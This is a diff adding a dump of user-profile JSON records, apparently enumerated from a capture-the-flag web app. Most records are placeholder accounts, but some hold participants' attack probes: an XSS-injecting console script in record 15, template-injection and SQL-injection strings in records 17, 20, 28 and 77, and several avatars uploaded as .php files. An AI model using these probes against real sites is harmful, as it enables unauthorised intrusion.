@@ -1,0 +1,1372 @@
+ID = 1
+{"id":1,"fullName":"CTF Admin","username":"admin","email":"123@gmail.com","description":"hihi","avatar":"/uploads/user_undefined_1760752457329.JPG","birthdate":null,"gender":null,"company":null}
+
+ID = 2
+{"id":2,"fullName":"Alice User","username":"alice","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 3
+{"id":3,"fullName":"Bob Mr.","username":"bob","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 4
+{"id":4,"fullName":"Lim Mrs.","username":"lim","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 5
+{"id":5,"fullName":"Calors M.","username":"carlos","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 6
+{"id":6,"fullName":"Albuquerquess Pi","username":"albuquerque","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 7
+{"id":7,"fullName":"Maya Sunrise","username":"isabella","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 8
+{"id":8,"fullName":"Diego Rivers","username":"marco","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 9
+{"id":9,"fullName":"Sora Kato","username":"lin","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 10
+{"id":10,"fullName":"Evelyn Hart","username":"nora","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 11
+{"id":11,"fullName":"Bashir Al-Fadil","username":"omar","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 12
+{"id":12,"fullName":"Juniper Vale","username":"sophia","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 13
+{"id":13,"fullName":"Cassian Moir","username":"ryan","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 14
+{"id":14,"fullName":"Zhen Lian","username":"mina","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 15
+{"id":15,"fullName":"Torin Blackwood","username":"zeke","email":"zeke@example.com","description":"(function(){\n  // payload để test\n  const payload = '<script>alert(\"XSS\")</script>';\n\n  // tìm trường company hoặc description (nhiều cách để match)\n  const selectors = [\n    'input[name=\"company\"]',\n    'textarea[name=\"company\"]',\n    '#company',\n    'input[placeholder*=\"Company\"]',\n    'textarea[placeholder*=\"Company\"]',\n    'input[placeholder*=\"company\"]',\n    'textarea[placeholder*=\"Description\"]',\n    'textarea[name=\"description\"]',\n    '#description'\n  ];\n  let field = null;\n  for(const s of selectors){\n    field = document.querySelector(s);\n    if(field) break;\n  }\n  if(!field){\n    // fallback: tìm input/textarea có label 'Company' hoặc 'Description'\n    const labels = [...document.querySelectorAll('label')];\n    for(const lbl of labels){\n      const txt = lbl.innerText.toLowerCase();\n      if(txt.includes('company') || txt.includes('description')){\n        const forId = lbl.getAttribute('for');\n        if(forId){\n          field = document.getElementById(forId);\n          if(field) break;\n        }\n      }\n    }\n  }\n  if(!field){\n    console.warn('Không tìm thấy field Company/Description tự động. Hãy chạy lệnh liệt kê (bên trên) và copy selector thủ công.');\n    return;\n  }\n\n  // set value và phát event input để framework/react/vue nhận thay đổi\n  field.focus();\n  field.value = payload;\n  field.dispatchEvent(new Event('input', {bubbles: true}));\n  field.dispatchEvent(new Event('change', {bubbles: true}));\n\n  // tìm form liên quan\n  const form = field.closest('form') || document.querySelector('form');\n  // tìm nút submit trong form (nhiều fallback)\n  let submitBtn = form && (form.querySelector('button[type=\"submit\"], input[type=\"submit\"], .btn-custom, button.btn, .btn-primary'));\n  if(!submitBtn){\n    // tìm trên toàn trang\n    submitBtn = document.querySelector('button[type=\"submit\"], input[type=\"submit\"], .btn-custom, button.btn, .btn-primary');\n  }\n\n  // cách 1: click nút (nếu tồn tại)\n  if(submitBtn){\n    console.log('Clicking submit button:', submitBtn);\n    submitBtn.click();\n    return;\n  }\n\n  // cách 2: submit form trực tiếp (nếu có form)\n  if(form){\n    console.log('Submitting form element directly');\n    form.submit(); // sẽ gửi form theo action method nếu là form truyền thống\n    return;\n  }\n\n  // cách 3: nếu app dùng JS/XHR và không có form action, thử tìm handler global (ví dụ nút có sự kiện)\n  // fallback: trigger Enter key on field (nhiều form nghe Enter)\n  console.log('No submit button or form found — dispatching Enter keypress on field as fallback');\n  field.dispatchEvent(new KeyboardEvent('keydown', {key:'Enter', keyCode:13, which:13, bubbles:true}));\n})();\n","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":"<script>alert("}
+
+ID = 16
+{"id":16,"fullName":"Liora Wren","username":"anya","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 17
+{"id":17,"fullName":"test test","username":"test","email":"test1234@example.com","description":"{{7*7}}","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 18
+{"id":18,"fullName":"a a","username":"a","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 19
+{"id":19,"fullName":"Le Hieu","username":"hieu","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 20
+{"id":20,"fullName":"<h1>test</h1> {{7*7}}","username":"<h1>test</h1>","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 21
+{"id":21,"fullName":"s s","username":"s","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 22
+{"id":22,"fullName":"truong ngo","username":"ntrg","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 23
+{"id":23,"fullName":"Phan Dinh","username":"b2304036","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 24
+{"id":24,"fullName":"tam do","username":"tamdo1","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 25
+{"id":25,"fullName":"a i","username":"test1","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 26
+{"id":26,"fullName":"who you","username":"whoyou","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 27
+{"id":27,"fullName":"Toan Trinh","username":"toan123","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751389038.php","birthdate":null,"gender":"Male","company":null}
+
+ID = 28
+{"id":28,"fullName":"or ' 1 - 1 ' or ' 1 - 1 '","username":"or ' 1 - 1 '","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 29
+{"id":29,"fullName":"duc duc","username":"duc","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 30
+{"id":30,"fullName":"hello vfdv","username":"username","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 31
+{"id":31,"fullName":"thanh tua","username":"hades","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 32
+{"id":32,"fullName":"heh heh","username":"heh","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 33
+{"id":33,"fullName":"12 12","username":"abc@1","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 34
+{"id":34,"fullName":"yuu 123","username":"123","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 35
+{"id":35,"fullName":"test test","username":"testtesttest","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 36
+{"id":36,"fullName":"ngn ngn","username":"ngn","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 37
+{"id":37,"fullName":"t t","username":"t","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 38
+{"id":38,"fullName":"l3mnt2010 l3mnt2010","username":"l3mnt2010","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751355316.svg","birthdate":null,"gender":"Male","company":null}
+
+ID = 39
+{"id":39,"fullName":"th4n th4n","username":"th4n","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 40
+{"id":40,"fullName":"test test","username":"test123_","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 41
+{"id":41,"fullName":"bashu bashu","username":"bashu","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 42
+{"id":42,"fullName":"ki ki","username":"ki","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 43
+{"id":43,"fullName":"root root","username":"root","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 44
+{"id":44,"fullName":"s s","username":"ss","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 45
+{"id":45,"fullName":"pa va","username":"vapa","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 46
+{"id":46,"fullName":"123 123","username":"thanh","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 47
+{"id":47,"fullName":"hiep nguyen","username":"pentest","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 48
+{"id":48,"fullName":"cac cac","username":"cac","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 49
+{"id":49,"fullName":"a b","username":"tesst","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 50
+{"id":50,"fullName":"q q","username":"q","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 51
+{"id":51,"fullName":"2 2","username":"2","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 52
+{"id":52,"fullName":"asd asd","username":"asd","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 53
+{"id":53,"fullName":"do Nam","username":"namdt","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751340571.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 54
+{"id":54,"fullName":"he he","username":"hehe","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 55
+{"id":55,"fullName":"123 123","username":"duy","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 56
+{"id":56,"fullName":"asdf asdf","username":"asdf","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751520942.php","birthdate":null,"gender":"Male","company":null}
+
+ID = 57
+{"id":57,"fullName":"dsf asdf","username":"abcd","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 58
+{"id":58,"fullName":"kkkkk kkkkk","username":"kkkkk","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 59
+{"id":59,"fullName":"Tran Dong","username":"d0ng","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 60
+{"id":60,"fullName":"denver ng","username":"denver","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 61
+{"id":61,"fullName":"trieu dai","username":"trieudai","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 62
+{"id":62,"fullName":"a a","username":"hi","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 63
+{"id":63,"fullName":"long bui","username":"124","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 64
+{"id":64,"fullName":"Hiếu  Lại","username":"hieulai","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 65
+{"id":65,"fullName":"a' a'","username":"aaaaaa","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 66
+{"id":66,"fullName":"Hieu Nguyen Minh","username":"nguyenminhhieu","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 67
+{"id":67,"fullName":"onsra onsra","username":"onsra","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 68
+{"id":68,"fullName":"gadak gadak","username":"focu8","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 69
+{"id":69,"fullName":"a a","username":"aa","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 70
+{"id":70,"fullName":"1 1","username":"1234","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 71
+{"id":71,"fullName":"wr vn","username":"wr","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752344215.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 72
+{"id":72,"fullName":"lam lam","username":"lam","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 73
+{"id":73,"fullName":"1 1","username":"khoa101","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 74
+{"id":74,"fullName":"aedtsd sdfsdf","username":"test123123","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 75
+{"id":75,"fullName":"Quang Truong","username":"TruongTAS","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 76
+{"id":76,"fullName":"ccc ccc","username":"cccc","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 77
+{"id":77,"fullName":"' OR 'x'='x ' OR 'x'='x","username":"' OR 'x'='x","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 78
+{"id":78,"fullName":"111 a","username":"a111","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 79
+{"id":79,"fullName":"khoa dang","username":"khoa","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 80
+{"id":80,"fullName":"aaa bbb","username":"dunvuo","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751571403.png","birthdate":null,"gender":"Male","company":null}
+
+ID = 81
+{"id":81,"fullName":"cc cc","username":"concac","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 82
+{"id":82,"fullName":"cc cc","username":"ccc","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 83
+{"id":83,"fullName":"Alex bizer","username":"Alex","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 84
+{"id":84,"fullName":"aaa a","username":"aaa","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 85
+{"id":85,"fullName":"bao nguyen","username":"nlgbao","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 86
+{"id":86,"fullName":"hehe hehe","username":"hehe123","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 87
+{"id":87,"fullName":"trung hoang","username":"trung1","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 88
+{"id":88,"fullName":"hung nguyen","username":"hung","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 89
+{"id":89,"fullName":"ad ad","username":"admin1","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752162708.php","birthdate":null,"gender":"Male","company":null}
+
+ID = 90
+{"id":90,"fullName":"a a","username":"jameskaois","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 91
+{"id":91,"fullName":"123123 123123","username":"123123","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 92
+{"id":92,"fullName":"abac abac","username":"abacabacabac","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 93
+{"id":93,"fullName":"dat ht","username":"datht","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 94
+{"id":94,"fullName":"aaaa aaa","username":"abc","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 95
+{"id":95,"fullName":"a b","username":"aaaa","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 96
+{"id":96,"fullName":"f g","username":"tuantc3751","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 97
+{"id":97,"fullName":"test2 test2","username":"test2","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 98
+{"id":98,"fullName":"ab ab","username":"ab","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 99
+{"id":99,"fullName":"Huy Nam","username":"huynam","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 100
+{"id":100,"fullName":"dav dav","username":"dav","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 101
+{"id":101,"fullName":"123 123","username":"bbb","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 102
+{"id":102,"fullName":"bnhannasndn bnhannasndn","username":"bnhannasndnbnhannasndn","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 103
+{"id":103,"fullName":"vodanh vodanh","username":"vodanh","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751513834.php","birthdate":null,"gender":"Male","company":null}
+
+ID = 104
+{"id":104,"fullName":"123 123","username":"12345","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752466848.php","birthdate":null,"gender":"Male","company":null}
+
+ID = 105
+{"id":105,"fullName":"1s01v3sp33d 1","username":"wiener","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752523172.php","birthdate":null,"gender":"Male","company":null}
+
+ID = 106
+{"id":106,"fullName":"DDD DDD","username":"wastaken","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 107
